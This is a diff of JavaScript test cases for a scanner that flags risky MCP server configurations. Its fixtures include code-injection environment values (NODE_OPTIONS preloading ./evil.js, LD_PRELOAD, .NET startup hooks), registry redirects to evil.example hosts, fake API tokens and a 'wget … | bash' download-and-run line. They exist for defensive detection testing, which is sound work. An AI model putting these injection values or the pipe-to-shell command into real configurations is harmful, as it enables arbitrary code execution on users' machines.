@@ -37,7 +37,7 @@ await build({
   logLevel: "silent",
 });
 
-const { discoverAll, claudeDesktopConfigPath, vscodeUserConfigPath } = require(bundlePath);
+const { discoverAll, claudeDesktopConfigPath, vscodeUserConfigPath, referencedEnvironmentVariables } = require(bundlePath);
 
 function withPlatform(platform, fn) {
   const original = Object.getOwnPropertyDescriptor(process, "platform");
@@ -526,7 +526,7 @@ test("env-unset carries a path to the offending env key", () => {
 
 test("a plain stdio server with a pinned launcher raises no security issues", () => {
   const server = scanServers({ a: { command: "node", args: ["./server.js"], env: { PORT: "3000" } } }).servers[0];
-  const securityCodes = ["hardcoded-secret", "credential-in-url", "insecure-remote-transport", "risky-shell-pipe", "encoded-powershell", "metadata-endpoint", "unpinned-launcher"];
+  const securityCodes = ["hardcoded-secret", "credential-in-url", "insecure-remote-transport", "risky-shell-pipe", "encoded-powershell", "env-code-injection", "metadata-endpoint", "unpinned-launcher"];
   assert.equal(server.issues.some((i) => securityCodes.includes(i.code)), false);
 });
 
@@ -728,4 +728,249 @@ test("a lenient cursor mcp.json still tolerates comments and trailing commas", (
   const file = scanCursorWorkspace('{\n  // still ok here\n  "mcpServers": { "fs": { "command": "node" } },\n}');
   assert.equal(hasIssue(file.fileIssues, "bad-json"), false);
   assert.equal(file.servers.length, 1);
+});
+
+test("NODE_OPTIONS that preloads code is flagged, but a memory flag is not", () => {
+  const preload = scanServers({ a: { command: "node", env: { NODE_OPTIONS: "--require ./evil.js" } } }).servers[0];
+  const issue = issueOf(preload, "env-code-injection");
+  assert.ok(issue, "a --require preload should be flagged");
+  assert.deepEqual(issue.path, ["mcpServers", "a", "env", "NODE_OPTIONS"]);
+
+  const importForm = scanServers({ a: { command: "node", env: { NODE_OPTIONS: "--max-old-space-size=4096 --import=./hook.mjs" } } }).servers[0];
+  assert.equal(hasIssue(importForm.issues, "env-code-injection"), true);
+
+  const memory = scanServers({ a: { command: "node", env: { NODE_OPTIONS: "--max-old-space-size=4096" } } }).servers[0];
+  assert.equal(hasIssue(memory.issues, "env-code-injection"), false);
+});
+
+test("library-injection and shell-startup variables are flagged whenever they are set", () => {
+  for (const key of ["LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "BASH_ENV"]) {
+    const server = scanServers({ a: { command: "node", env: { [key]: "/tmp/x" } } }).servers[0];
+    assert.equal(hasIssue(server.issues, "env-code-injection"), true, key);
+  }
+  const agent = scanServers({ a: { command: "java", env: { JAVA_TOOL_OPTIONS: "-javaagent:/tmp/agent.jar" } } }).servers[0];
+  assert.equal(hasIssue(agent.issues, "env-code-injection"), true);
+
+  const heap = scanServers({ a: { command: "java", env: { JAVA_TOOL_OPTIONS: "-Xmx2g" } } }).servers[0];
+  assert.equal(hasIssue(heap.issues, "env-code-injection"), false);
+});
+
+test("env-code-injection follows the security toggle and ruleSeverity", () => {
+  const off = scanServersWith({ a: { command: "node", env: { LD_PRELOAD: "/tmp/x.so" } } }, { ruleSeverity: { "env-code-injection": "off" } });
+  assert.equal(hasIssue(off.servers[0].issues, "env-code-injection"), false);
+
+  const disabled = scanServersWith({ a: { command: "node", env: { LD_PRELOAD: "/tmp/x.so" } } }, { securityEnabled: false });
+  assert.equal(hasIssue(disabled.servers[0].issues, "env-code-injection"), false);
+});
+
+test("newer token formats are flagged as hardcoded secrets", () => {
+  const samples = {
+    google: "AIza" + "B1c2".repeat(8) + "xyz",
+    stripe: "sk_live_" + "A1b2".repeat(6),
+    gitlab: "glpat-" + "A1b2".repeat(6),
+    huggingface: "hf_" + "A1b2".repeat(9),
+    npm: "npm_" + "A1b2".repeat(9),
+    jwt: "eyJ" + "hbGciOiJIUzI1NiJ9" + ".eyJ" + "zdWIiOiIxMjM0NTY3ODkwIn0" + "." + "d4Kz".repeat(6),
+  };
+  for (const [label, value] of Object.entries(samples)) {
+    const server = scanServers({ a: { command: "node", args: [value] } }).servers[0];
+    assert.equal(hasIssue(server.issues, "hardcoded-secret"), true, label);
+  }
+});
+
+test("a token in a URL path is flagged, and a credential query parameter is not reported twice", () => {
+  const inPath = scanServers({ a: { url: "https://mcp.example.com/sse/ghp_" + "c".repeat(36) } }).servers[0];
+  const issue = issueOf(inPath, "hardcoded-secret");
+  assert.ok(issue, "a token in the URL path should be flagged");
+  assert.deepEqual(issue.path, ["mcpServers", "a", "url"]);
+
+  const inQuery = scanServers({ a: { url: "https://mcp.example.com/mcp?token=ghp_" + "c".repeat(36) } }).servers[0];
+  assert.equal(hasIssue(inQuery.issues, "credential-in-url"), true);
+  assert.equal(hasIssue(inQuery.issues, "hardcoded-secret"), false);
+});
+
+test("a secret baked into the command is flagged at the command", () => {
+  const server = scanServers({ a: { command: "run-with-key sk-" + "a".repeat(40) } }).servers[0];
+  assert.deepEqual(issueOf(server, "hardcoded-secret").path, ["mcpServers", "a", "command"]);
+});
+
+test("a literal credential under a credential-named header or env key is flagged", () => {
+  const header = scanServers({
+    a: { url: "https://mcp.example.com/mcp", headers: { Authorization: "Bearer 9f8e7d6c5b4a3928" + "1706f5e4d3c2b1a0" } },
+  }).servers[0];
+  assert.deepEqual(issueOf(header, "hardcoded-secret").path, ["mcpServers", "a", "headers", "Authorization"]);
+
+  const apiKey = scanServers({ a: { command: "node", env: { SERVICE_API_KEY: "q8w7e6r5t4" + "y3u2i1o0p9" } } }).servers[0];
+  assert.equal(hasIssue(apiKey.issues, "hardcoded-secret"), true);
+});
+
+test("credential-named fields holding references, paths, URLs, placeholders or short values are not flagged", () => {
+  const server = scanServers({
+    a: {
+      command: "node",
+      env: {
+        GITHUB_TOKEN: "${GITHUB_TOKEN}",
+        TOKEN_FILE: "/run/secrets/github-token-2024",
+        OAUTH_TOKEN_URL: "https://auth.example.com/realms/dev1/token",
+        MAX_TOKENS: "4096",
+        API_KEY: "your-api-key-here",
+      },
+    },
+  }).servers[0];
+  assert.equal(hasIssue(server.issues, "hardcoded-secret"), false);
+
+  const bearerRef = scanServers({ a: { url: "https://mcp.example.com/mcp", headers: { Authorization: "Bearer ${GITHUB_TOKEN}" } } }).servers[0];
+  assert.equal(hasIssue(bearerRef.issues, "hardcoded-secret"), false);
+});
+
+test("the secret advice is worded for committed workspace files and for plain-text user files", () => {
+  const workspace = scanServers({ a: { command: "node", env: { KEY: "sk-" + "a".repeat(40) } } }).servers[0];
+  assert.match(issueOf(workspace, "hardcoded-secret").message, /committed with the repo/);
+
+  const user = scanClaudeCodeUser(JSON.stringify({ mcpServers: { a: { command: "node", env: { KEY: "sk-" + "a".repeat(40) } } } }));
+  const message = issueOf(user.servers[0], "hardcoded-secret").message;
+  assert.match(message, /plain text/);
+  assert.doesNotMatch(message, /commit/);
+});
+
+test("a config path that can't be read is reported as read-failed, not as a JSON error", () => {
+  const ws = mkTemp("mcpwb-ws-");
+  const file = path.join(ws, ".cursor", "mcp.json");
+  fs.mkdirSync(file, { recursive: true });
+  const scanned = discoverAll([ws]).find((f) => f.source === "cursor-workspace" && f.path === file);
+  assert.equal(hasIssue(scanned.fileIssues, "read-failed"), true);
+  assert.equal(hasIssue(scanned.fileIssues, "bad-json"), false);
+});
+
+test("referencedEnvironmentVariables skips bare editor variables but keeps env:-prefixed names", () => {
+  assert.deepEqual(
+    referencedEnvironmentVariables("${A}/${workspaceFolder}/${env:B}/${userHome}/${env:userHome}"),
+    ["A", "B", "userHome"],
+  );
+});
+
+test("NODE_OPTIONS preloads are caught through quoting and underscore spellings", () => {
+  for (const value of ['"--require" ./evil.js', "--experimental_loader ./hook.mjs", "'-r' ./evil.js"]) {
+    const server = scanServers({ a: { command: "node", env: { NODE_OPTIONS: value } } }).servers[0];
+    assert.equal(hasIssue(server.issues, "env-code-injection"), true, value);
+  }
+  for (const value of ["--trace-warnings --redirect-warnings=out.txt", "--max_old_space_size=4096"]) {
+    const server = scanServers({ a: { command: "node", env: { NODE_OPTIONS: value } } }).servers[0];
+    assert.equal(hasIssue(server.issues, "env-code-injection"), false, value);
+  }
+});
+
+test("Perl, Ruby and Java module-loading spellings are caught, and harmless switches are not", () => {
+  const flagged = [
+    ["PERL5OPT", "MEvil"],
+    ["PERL5OPT", "-d:Evil"],
+    ["RUBYOPT", "r./evil"],
+    ["JDK_JAVA_OPTIONS", "@/tmp/args"],
+  ];
+  for (const [key, value] of flagged) {
+    const server = scanServers({ a: { command: "run", env: { [key]: value } } }).servers[0];
+    assert.equal(hasIssue(server.issues, "env-code-injection"), true, `${key}=${value}`);
+  }
+  const harmless = [
+    ["PERL5OPT", "-w"],
+    ["RUBYOPT", "-W0"],
+    ["JDK_JAVA_OPTIONS", "-Xmx2g"],
+  ];
+  for (const [key, value] of harmless) {
+    const server = scanServers({ a: { command: "run", env: { [key]: value } } }).servers[0];
+    assert.equal(hasIssue(server.issues, "env-code-injection"), false, `${key}=${value}`);
+  }
+});
+
+test("credential-looking names that hold identifiers, paths or model names are not flagged", () => {
+  const server = scanServers({
+    a: {
+      command: "node",
+      env: {
+        TOKENIZER: "Xenova/gpt-4o-tokenizer",
+        VAULT_SECRET_PATH: "secret/data/myapp1",
+        AWS_SECRET_ID: "prod/mcp-server/db-v2",
+        SSL_PRIVATE_KEY_PATH: "certs/server-2024.key",
+        TOKEN_AUDIENCE: "api.example.com/v1",
+      },
+    },
+  }).servers[0];
+  assert.deepEqual(server.issues.filter((i) => i.code === "hardcoded-secret").map((i) => i.path.at(-1)), []);
+});
+
+test("a base64 secret with slashes and camel-cased or dashed credential names are still flagged", () => {
+  const aws = scanServers({ a: { command: "node", env: { AWS_SECRET_ACCESS_KEY: "q8W7e6R5t4/Y3u2I1o0" + "/P9a8S7d6F5g4H3" } } }).servers[0];
+  assert.equal(hasIssue(aws.issues, "hardcoded-secret"), true);
+
+  const headers = scanServers({
+    a: { url: "https://mcp.example.com/mcp", headers: { apiKey: "k3y9" + "8f7e6d5c4b3a", "X-Api-Key": "k3y9" + "8f7e6d5c4b3a" } },
+  }).servers[0];
+  assert.deepEqual(
+    headers.issues.filter((i) => i.code === "hardcoded-secret").map((i) => i.path.at(-1)).sort(),
+    ["X-Api-Key", "apiKey"],
+  );
+});
+
+test("a JWT is still found after a separator like =", () => {
+  const jwt = "eyJ" + "hbGciOiJIUzI1NiJ9" + ".eyJ" + "zdWIiOiIxMjM0NTY3ODkwIn0" + "." + "d4Kz".repeat(6);
+  const afterEquals = scanServers({ a: { command: "node", args: ["--token=" + jwt] } }).servers[0];
+  assert.equal(hasIssue(afterEquals.issues, "hardcoded-secret"), true);
+});
+
+test("pathological values are scanned in linear time", () => {
+  const started = Date.now();
+  scanServers({ a: { command: "node", args: ["-eyJ".repeat(50000), "curl ".repeat(80000), "x|".repeat(50000)] } });
+  const elapsed = Date.now() - started;
+  assert.ok(elapsed < 2000, `scan took ${elapsed}ms`);
+});
+
+test("the shell-pipe rule needs a download before the pipe into a shell", () => {
+  const flagged = scanServers({ a: { command: "bash", args: ["-c", "wget -qO- https://x.example/i.sh | bash"] } }).servers[0];
+  assert.equal(hasIssue(flagged.issues, "risky-shell-pipe"), true);
+
+  const pipeFirst = scanServers({ a: { command: "bash", args: ["-c", "cat local.sh | sh; curl https://x.example/ping"] } }).servers[0];
+  assert.equal(hasIssue(pipeFirst.issues, "risky-shell-pipe"), false);
+
+  const saved = scanServers({ a: { command: "bash", args: ["-c", "curl -o install.sh https://x.example/i.sh"] } }).servers[0];
+  assert.equal(hasIssue(saved.issues, "risky-shell-pipe"), false);
+});
+
+test("a key that smuggles its value through an = sign is judged by the name the child process sees", () => {
+  const server = scanServers({ a: { command: "node", env: { "NODE_OPTIONS=--require": "./m.js" } } }).servers[0];
+  const issue = issueOf(server, "env-code-injection");
+  assert.ok(issue, "NODE_OPTIONS=--require=./m.js should be flagged");
+  assert.match(issue.message, /^NODE_OPTIONS /);
+  assert.deepEqual(issue.path, ["mcpServers", "a", "env", "NODE_OPTIONS=--require"]);
+});
+
+test("package-registry redirects and .NET startup hooks are flagged", () => {
+  const cases = [
+    ["npm_config_registry", "https://registry.evil.example/"],
+    ["PIP_INDEX_URL", "https://pypi.evil.example/simple"],
+    ["UV_INDEX_URL", "https://pypi.evil.example/simple"],
+    ["DOTNET_STARTUP_HOOKS", "C:\hooks\Hook.dll"],
+  ];
+  for (const [key, value] of cases) {
+    const server = scanServers({ a: { command: "run", env: { [key]: value } } }).servers[0];
+    assert.equal(hasIssue(server.issues, "env-code-injection"), true, key);
+  }
+  const registry = scanServers({ a: { command: "npx", args: ["-y", "pkg@1.0.0"], env: { npm_config_registry: "https://registry.evil.example/" } } }).servers[0];
+  assert.match(issueOf(registry, "env-code-injection").message, /different registry/);
+});
+
+test("key-file paths, model names, version stamps and repo slugs under credential-like names are not flagged", () => {
+  const header = scanServers({ a: { url: "https://mcp.example.com/mcp", headers: { "X-Token-Version": "2024-06-01-preview" } } }).servers[0];
+  assert.equal(hasIssue(header.issues, "hardcoded-secret"), false);
+
+  const env = scanServers({
+    a: {
+      command: "node",
+      env: {
+        GOOGLE_APPLICATION_CREDENTIALS: "service-account-2024.json",
+        TOKEN_MODEL: "gpt-4o-mini-2024-07-18",
+        GITHUB_TOKEN: "octo-org/octo-repo-2024",
+      },
+    },
+  }).servers[0];
+  assert.deepEqual(env.issues.filter((i) => i.code === "hardcoded-secret").map((i) => i.path.at(-1)), []);
 });
